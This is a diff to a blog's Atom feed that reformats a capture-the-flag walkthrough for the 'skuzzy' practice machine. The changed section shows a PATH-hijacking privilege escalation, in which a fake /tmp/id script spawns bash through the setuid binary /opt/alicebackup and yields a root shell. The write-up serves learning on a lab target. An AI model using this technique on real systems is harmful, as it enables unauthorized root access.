@@ -4,7 +4,7 @@
   <title><![CDATA[CyberSlave]]></title>
   <link href="http://ryanoberto.github.io/atom.xml" rel="self"/>
   <link href="http://ryanoberto.github.io/"/>
-  <updated>2017-03-28T13:10:44+02:00</updated>
+  <updated>2017-03-28T14:23:55+02:00</updated>
   <id>http://ryanoberto.github.io/</id>
   <author>
     <name><![CDATA[Ryan Oberto]]></name>
@@ -613,19 +613,62 @@ and changed the &lt;?php ?> to ##php##</p>
 </span><span class='line'>/opt/alicebackup</span></code></pre></td></tr></table></div></figure>
 
 
-<p>cat /tmp/id</p>
+<p>/opt/alicebackup looks interesting, running it we can see it runs the id command before trying to connect to alice.home</p>
 
-<h1>!/bin/bash</h1>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@skuzzy:/opt$ ./alicebackup
+</span><span class='line'>./alicebackup
+</span><span class='line'>uid=0(root) gid=0(root) groups=0(root),33(www-data)
+</span><span class='line'>ssh: Could not resolve hosdtname alice.home: Name or service not known
+</span><span class='line'>lost connection
+</span></code></pre></td></tr></table></div></figure>
 
-<p>/bin/bash</p>
 
-<p>export PATH=/tmp</p>
+<p>lets create our own id command</p>
 
-<p>www-data@skuzzy:/opt$ ./alicebackup
-./alicebackup
-bash: groups: command not found
-root@skuzzy:/opt#
-root@skuzzy:/opt# export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat /tmp/id
+</span><span class='line'>#!/bin/bash
+</span><span class='line'>/bin/bash
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>change our path so it gets called</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>export PATH=/tmp
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@skuzzy:/opt$ ./alicebackup
+</span><span class='line'>./alicebackup
+</span><span class='line'>bash: groups: command not found
+</span><span class='line'>root@skuzzy:/opt# 
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Fix the PATH</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>
+</span><span class='line'>root@skuzzy:/opt# export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Flag 5</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -656,7 +699,8 @@ root@skuzzy:/opt# export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:
 </span><span class='line'>Too hard?
 </span><span class='line'>Too much stuff to install to get the iSCSI initiator working?
 </span><span class='line'>
-</span><span class='line'>Drop me a line on twitter @vortexau, or via email vortex@juicedigital.net</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>Drop me a line on twitter @vortexau, or via email vortex@juicedigital.net
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p>This was great fun and learnt something new, Thanks <a href="https://twitter.com/@vortexau">@vortexau</a></p>
